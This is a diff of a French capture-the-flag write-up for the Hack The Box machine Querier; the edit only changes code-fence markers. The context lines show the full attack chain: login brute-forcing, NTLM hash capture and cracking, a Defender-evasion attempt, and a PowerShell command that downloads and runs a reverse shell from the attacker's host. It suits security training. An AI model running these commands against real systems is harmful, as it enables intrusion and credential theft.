@@ -12,7 +12,7 @@ Ce CTF est donné à 30 points, ce qui pourrait se traduire par *difficulté moy
 
 On trouve sur cette machine les classiques ports Windows et OH du mssql :  
 
-```plain
+```
 $ sudo masscan --rate 1000 -e tun0 -p1-65535,U:1-65535 10.10.10.125
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
@@ -34,7 +34,7 @@ Discovered open port 49664/tcp on 10.10.10.125
 
 On peut conserver l'output de *masscan* pour récupérer la liste des ports ouverts et les rassembler par des virgules :  
 
-```plain
+```
 $ grep Discovered output.txt | cut -d' ' -f4 | cut -d/ -f1 | paste -d ',' -s
 49668,47001,139,5985,49671,445,49667,135,49670,49666,1433,49664
 ```
@@ -47,7 +47,7 @@ sudo nmap -sV -sC -T5 --script safe -p 49668,47001,139,5985,49671,445,49667,135,
 
 Nmap parvient à nous sortir quelques infos utiles du MSSQL :  
 
-```plain
+```
 PORT      STATE SERVICE       VERSION
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
@@ -102,7 +102,7 @@ Malheureusement ce n'est pas à la hauteur de nos espérances.
 
 *sa* n’apparaît pas dans la liste des passwords mais Nmap semble tester le username comme password systématiquement :  
 
-```plain
+```
     if ( status ) then
       for username in usernames do
         if stopInstance then break end
@@ -131,7 +131,7 @@ Share plz
 
 Il aura fallut remplir quelques options au module *smb\_login* de *Metasploit* pour parvenir à trouver que l'utilisateur *sa* a bien le mot de passe *sa* :p   
 
-```plain
+```
 msf5 auxiliary(scanner/smb/smb_login) > show options
 
 Module options (auxiliary/scanner/smb/smb_login):
@@ -172,7 +172,7 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 
 On peut enchainer sur l'énumération des partages :  
 
-```plain
+```
 msf5 auxiliary(scanner/smb/smb_enumshares) > run
 
 [-] 10.10.10.125:139      - Login Failed: Unable to Negotiate with remote host
@@ -186,7 +186,7 @@ msf5 auxiliary(scanner/smb/smb_enumshares) > run
 
 Pour changer un peut on peut utiliser un outil de *Impacket* au lieu de l’habituel *smbclient* :  
 
-```plain
+```
 $ python examples/smbclient.py QUERIER/sa@10.10.10.125
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -217,7 +217,7 @@ conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=n
 
 J'ai ensuite regroupé les différents utilisateurs (*sa*, *reporting*) et passwords dans des fichiers respectifs : c'est reparti pour le SQL !  
 
-```plain
+```
 msf5 auxiliary(scanner/mssql/mssql_login) > show options
 
 Module options (auxiliary/scanner/mssql/mssql_login):
@@ -259,7 +259,7 @@ Maintenant qu'on peut se connecter au SQL on va utiliser la même astuce que sur
 
 Une fois de plus *Metasploit* dispose d'un module rien que pour cela (ça consiste seulement à appeler *xp\_dirtree*) :  
 
-```plain
+```
 msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > show options
 
 Module options (auxiliary/admin/mssql/mssql_ntlm_stealer):
@@ -288,7 +288,7 @@ La machine a désactivé l'emploi de SMBv1 donc on doit avoir recours à serveur
 
 *Impacket* fait très bien l'affaire :  
 
-```plain
+```
 # python examples/smbserver.py -smb2support public /tmp/
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -316,7 +316,7 @@ Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
 Le hash ne met pas longtemps à être cracké :  
 
-```plain
+```
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -333,7 +333,7 @@ Avec ces identifiants on peut jouer avec les différents modules *auxiliary/admi
 
 On va transformer notre accès d'administrateur SQL en exécution de commande :  
 
-```plain
+```
 msf5 auxiliary(admin/mssql/mssql_exec) > show options
 
 Module options (auxiliary/admin/mssql/mssql_exec):
@@ -360,7 +360,7 @@ msf5 auxiliary(admin/mssql/mssql_exec) > run
 
 Le module ne nous donne pas l'output mais la copie s'est bien effectuée :  
 
-```plain
+```
 $ cat /tmp/hello.txt
 querier\mssql-svc
 ```
@@ -372,7 +372,7 @@ Police and thieves in the streets
 
 Toujours via redirection d'output j'ai récupéré la liste des process (*tasklist*) et on voit que *Defender* est présent sur la machine :   
 
-```plain
+```
 MsMpEng.exe                   2200                            0    102,600 K
 ```
 
@@ -380,7 +380,7 @@ J'attendais justement une occasion de tester le nouveau module *evasion* de *Met
 
 Je m'attendais à quelque chose de plus fourni côté options (ça viendra sans doute) :  
 
-```plain
+```
 msf5 evasion(windows/windows_defender_exe) > show options
 
 Module options (evasion/windows/windows_defender_exe):
@@ -412,7 +412,7 @@ msf5 evasion(windows/windows_defender_exe) > run
 
 Essayons de faire exécuter notre binaire depuis notre partage SMB :  
 
-```plain
+```
  output
  ------
  The system cannot execute the specified program.
@@ -420,7 +420,7 @@ Essayons de faire exécuter notre binaire depuis notre partage SMB :
 
 hmmmm... Essayons de le copier en local ?  
 
-```plain
+```
  output
  ------
  Operation did not complete successfully because the file contains a virus or potentially unwanted software.
@@ -434,7 +434,7 @@ Windows privesc dor dummies
 
 Du coup c'est parti pour l'utilisation de Powershell. Je fais télécharger et exécuter un reverse shell *Nishang* :  
 
-```plain
+```
 msf5 auxiliary(admin/mssql/mssql_exec) > set CMD 'c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.208:8000/Invoke-PowerShellTcp.ps1\")'
 CMD => c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.208:8000/Invoke-PowerShellTcp.ps1\")
 msf5 auxiliary(admin/mssql/mssql_exec) > run
@@ -445,7 +445,7 @@ msf5 auxiliary(admin/mssql/mssql_exec) > run
 
 J'enchaîne illico sur [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) :  
 
-```plain
+```
 PS C:\Windows\system32> IEX (New-Object System.Net.Webclient).DownloadString("http://10.10.14.208:8000/PowerUp.ps1")
 PS C:\Windows\system32> cd /
 PS C:\> Invoke-AllChecks
@@ -501,7 +501,7 @@ At line:3704 char:21
 
 Ce dernier nous a trouvé le mot de passe administrateur dans un fichier *Unattend* :)  
 
-```plain
+```
 $ python examples/psexec.py 'QUERIER/Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
